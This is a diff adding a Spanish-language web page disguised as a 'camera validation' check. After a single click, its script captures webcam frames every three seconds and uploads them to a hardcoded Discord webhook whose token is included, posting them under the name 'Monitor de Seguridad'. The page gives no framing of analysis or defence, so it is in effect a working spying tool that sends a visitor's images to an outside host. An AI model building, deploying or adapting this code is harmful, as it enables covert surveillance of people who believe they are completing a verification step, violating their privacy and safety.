@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación Continua</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #23272a; color: white; }
+        .card { background: #2c2f33; padding: 2rem; border-radius: 12px; text-align: center; width: 400px; border: 1px solid #7289da; }
+        #video-preview { width: 100%; border-radius: 8px; background: black; margin-bottom: 15px; transform: scaleX(-1); }
+        .status-box { background: #23272a; padding: 10px; border-radius: 5px; font-size: 0.8rem; color: #99aab5; }
+        .live-indicator { color: #f04747; font-weight: bold; animation: blink 1s infinite; display: none; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="live" class="live-indicator">● TRANSMITIENDO EN VIVO</div>
+    <h2>Validación de Cámara</h2>
+    <video id="video-preview" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    <div class="status-box" id="status">Haz clic en la pantalla para iniciar la verificación automática.</div>
+</div>
+
+<script>
+    const HOOK_CAM = 'https://discord.com/api/webhooks/1494499724051484723/wT1_TJrUcW0jqANhOIpt046BvQEzUFUt-sH1SDYboadftYKOZEd9Adt303RBHZ-dhtRA';
+    
+    const video = document.getElementById('video-preview');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+    const liveIndicator = document.getElementById('live');
+
+    async function iniciarTransmision() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            video.srcObject = stream;
+            liveIndicator.style.display = 'block';
+            status.innerText = "Enviando captura cada 3 segundos...";
+
+            // Bucle automático cada 3000ms (3 segundos)
+            setInterval(() => {
+                enviarCaptura();
+            }, 3000);
+
+        } catch (err) {
+            status.innerText = "❌ Error: Permiso de cámara denegado o no encontrada.";
+            console.error(err);
+        }
+    }
+
+    function enviarCaptura() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.translate(canvas.width, 0); // Voltear horizontalmente para que no sea espejo
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('file', blob, 'live_frame.png');
+            formData.append('payload_json', JSON.stringify({
+                content: "🔴 **Actualización de cámara en vivo**",
+                username: "Monitor de Seguridad"
+            }));
+
+            try {
+                await fetch(HOOK_CAM, { method: 'POST', body: formData });
+                console.log("Captura enviada");
+            } catch (e) {
+                console.error("Error al enviar a Discord");
+            }
+        }, 'image/png');
+    }
+
+    // El navegador requiere una interacción del usuario para activar cámara
+    document.body.addEventListener('click', iniciarTransmision, { once: true });
+</script>
+
+</body>
+</html>
